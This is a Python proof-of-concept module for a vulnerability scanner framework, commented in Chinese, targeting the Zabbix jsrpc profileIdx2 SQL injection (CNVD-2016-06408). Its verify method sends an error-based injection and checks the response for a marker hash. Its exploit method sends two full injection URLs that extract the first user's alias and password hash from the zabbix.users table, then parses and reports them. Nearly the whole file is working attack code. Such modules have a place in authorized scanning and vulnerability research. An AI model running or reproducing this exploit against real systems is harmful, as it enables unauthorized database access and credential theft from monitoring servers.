# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Zabbix_0000_p'  # 平台漏洞编号，留空
    name = 'Zabbix v2.2.x, 3.0.0-3.0.3 jsrpc 参数 profileIdx2 SQL 注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-07-22'  # 漏洞公布时间
    desc = '''
        zabbix是一个开源的企业级性能监控解决方案。
        Zabbix的jsrpc中profileIdx2参数存在insert方式的SQL注入漏洞。攻击者无需授权即可登录zabbix管理系统，也可通过script等功能直接获取zabbix服务器的操作权限。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2016-06408'  # 漏洞来源
    cnvd_id = 'CNVD-2016-06408'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zabbix'  # 漏洞应用名称
    product_version = ' Zabbix 3.0.x ,Zabbix 2.2.13 '  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6e9098fc-5db0-40f3-8564-940c145c1b11'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            payload = '''/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,md5(321),0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17'''
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.get('{target}{payload}'.format(
                target=self.target, payload=payload))
            r = request.text
            if (request.status_code == 200) and ('caf1a3dfb505ffed0d024130f58c5cfa' in r):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            payload1 = '''/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,(select%20alias),0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17'''
            payload2 = '''/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,(select%20passwd),0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17'''
            self.output.info('开始对 {target} 进行 {vuln} 的漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            request1 = requests.get('{target}{payload}'.format(
                target=self.target, payload=payload1))
            request2 = requests.get('{target}{payload}'.format(
                target=self.target, payload=payload2))
            r1 = request1.text
            r2 = request2.text
            username = re.search(r"~(.+?)~~", r1).group(1)
            password = re.search(r"~(.+?)~~", r2).group(1)
            self.output.report(self.vuln, '\n发现了{name}\n用户名:{username} 密码:{password}'.format(
                name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
